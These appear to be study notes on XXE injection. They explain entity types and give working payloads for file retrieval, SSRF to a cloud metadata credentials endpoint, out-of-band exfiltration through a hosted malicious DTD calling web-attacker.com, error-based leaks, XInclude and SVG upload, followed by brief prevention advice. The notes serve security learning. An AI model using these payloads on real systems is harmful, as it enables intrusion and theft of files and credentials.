# What is XXE Injection? 
XML external entity injection (XXE) allows an attacker to interfere with processing of XML data. It often allows viewing of files on the server and interactions with backend / external systems that the app can access.

# How do XXE vulns happen? 
Some apps use XML to transmit data between the browser and server. However, the XML spec has potentially dangerous features by default. 

The XML document type definition (DTD) has declarations that can define the XML document structure. Some of these are in the document itself (internal DTD) or can be loaded from somewhere else (external DTD).

Custom external entities can look like: 

```
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]> 
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]> 
```

# What are the types of XXE attacks? 
- Retrieving files - external entity is defined pointing to a file and the content is returned in the response
- SSRF attacks - external entity defined as URL of a backend system
- Blind XXE out-of-band exfiltration - data is transmitted from the app to an attacker-controlled server
- Error message data retrieval - triggers a parsing error message containing sensitive data

# XXE Exploits - Retrieve files
Two steps: 
- Introduce a `DOCTYPE` element that defines the malicious external entity
- Edit a data value in the XML in the standard response to make use of the defined external entity

![5cf3ea19e6e6dbe43fbac85b9342a5a8.png](../../_resources/5cf3ea19e6e6dbe43fbac85b9342a5a8-1.png)

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>
<productId>&ext;</productId>
```

# XXE Exploits - SSRF
Similar to retrieving files, just with different syntax.

![71621a561f903f3f68d13caa158cfdbc.png](../../_resources/71621a561f903f3f68d13caa158cfdbc-1.png)

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin" > ]>
<productId>&ext;</productId>
```

# XXE Exploits - Blind

## Basic out-of-band detection
Sometimes XXE vulns are blind, meaning they don't return the values of any external entities in the responses. Direct retrieval is impossible, but you can trigger either out-of-band interactions or XML parsing errors that contain sensitive data.

You can often detect blind XXE using the same technique to trigger XXE SSRF attacks and monitor the DNS/HTTP requests of the server.

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]> 
```

Example in context: 
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://nxoppz1lkzzwmmof0mg8rfycs3yvmk.burpcollaborator.net"> ]> 
<productId>&xxe;</productId>
```

## Using XML parameter entities
Sometimes, XXE attacks using regular entities are blocked due to some input validation. In this case, try using XML parameter entities instead. XML parameter entities are a special kind of entity that can only be referenced in the DTD. 

Basically, to declare an XML parameter entity, just add a percent character before the entity name: 

```
<!ENTITY % myparameterentity "my parameter entity value" > 
```

And reference parameter entities using the percent character:

```
%myparameterentity; 
```

So, you can test blind XXE with XML parameter entities entirely within the DTD: 

```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]> 
```

## Exfiltrate data out-of-band

Detecting blind XXE is good, but exploiting it often requires more work in exfiltration. This can be done by hosting a malicious DTD on an attacker-controlled server, then invoking the external DTD from an XXE payload. 

An example malicious DTD to exfiltrate `/etc/passwd`: 
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

This DTD involves multiple steps: 
- Defines an XML parameter entity called `file`, containing the contents of `/etc/passwd`
- Defines an XML parameter entity called `eval`, containing a dynamic declaration of another XML parameter entity called `exfiltrate`. When the `exfiltrate` entity is evaluated, it makes an HTTP request to the attacker's web server containing the value of the file entity within the URL query string
- Uses the `eval` entity, which causes the dynamic declaration of the `exfiltrate` entity to be performed
- Uses the `exfiltrate` entity, so that its value is evaluated and it requests the specified URL

Remember that the attacker must host the malicious DTD above on a server they control, something like: 
```
http://web-attacker.com/malicious.dtd 
```

Then, invoke the external DTD inline by using an XXE payload: 
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]> 
```

> Note: this technique may not work with some file contents including newline characters because of the XML parsers. Using other protocols like FTP may work instead.

## Exfiltrate data using error messages 
Sometimes, you can trigger XML parsing errors where the error message contains the data you want to exfiltrate. This is possible when the app returns the error message in its response.

You can trigger an XML parsing error message that contains `/etc/passwd` using a DTD: 
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error; 
```

Remember to host the malicious DTD and invoke is using an XXE payload (see above)!

This DTD involves multiple steps: 
- Defines an XML parameter entity called `file`, containing the contents of the `/etc/passwd` file. 
- Defines an XML parameter entity called `eval`, containing a dynamic declaration of another XML parameter entity called `error`. The `error` entity will be evaluated by loading a nonexistent file whose name contains the value of the file entity. 
- Uses the `eval` entity, which causes the dynamic declaration of the `error` entity to be performed. 
- Uses the `error` entity, so that its value is evaluated by attempting to load the nonexistent file, resulting in an error message containing the name of the nonexistent file, which is the contents of the `/etc/passwd` file. 

Example output: 
```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
... 
```

# XXE Exploits - Hidden attack surfaces
Normally, XML data is included in HTTP requests/responses and this is obvious, but there are XXE attack surfaces that are a bit hidden.

## XInclude attacks
Some apps receive user-submitted data and embed it on the server-side into an XML document. (Example is when data is placed into a backend SOAP request) You can't carry a classic XXE because you don't control the entire XML document (can't just define/modify a `DOCTYPE` element). 

Instead, you can use `XInclude` that allows an XML document to be build from sub-documents. You can perform an attack even if you control a single item of data. Just reference the `XInclude` namespace and provide the path to the file you want to include (exfiltrate): 
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo> 
```

Example: 
![e29578489a3355bae9386311320fe274.png](../../_resources/e29578489a3355bae9386311320fe274-1.png)

## XXE attacks via file upload
Some apps allow users to upload files that are processed server-side. Some file formats use XML (sub)components, like DOCX and SVG. If processed insecurely, malicious files can be uploaded to inject XXE exploits.

Example exploit (Apache Batik): 
```
<?xml version="1.0" standalone="yes"?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-family="Verdana" font-size="28" x="10" y="40">&xxe;</text></svg> 
```

> Note: you might want to change the font size to make it readable.

Result: 
![0d9d6428aadb183b0691c848d28f70f4.png](../../_resources/0d9d6428aadb183b0691c848d28f70f4-1.png)

## XXE attacks via modified content type
Most POST requests use a default content type like `application/x-www-form-urlencoded`. However, you may be able to send other content types, including XML.

For example, instead of this: 
```
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar 
```

Try sending this: 
```
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo> 
```

# Wrap-up
Manually testing for XXE vulns usually involves: 
- Testing for basic file retrieval with common files
- Testing for blind XXE vulns using out-of-band techniques
- Testing for `XInclude` attack vulns and exploit basic file retrieval

# How to prevent XXE vulnerabilities
The easiest way is to disable certain XML parsing library features that are not needed. 
Disable resolution of external entities and support for `XInclude` in general.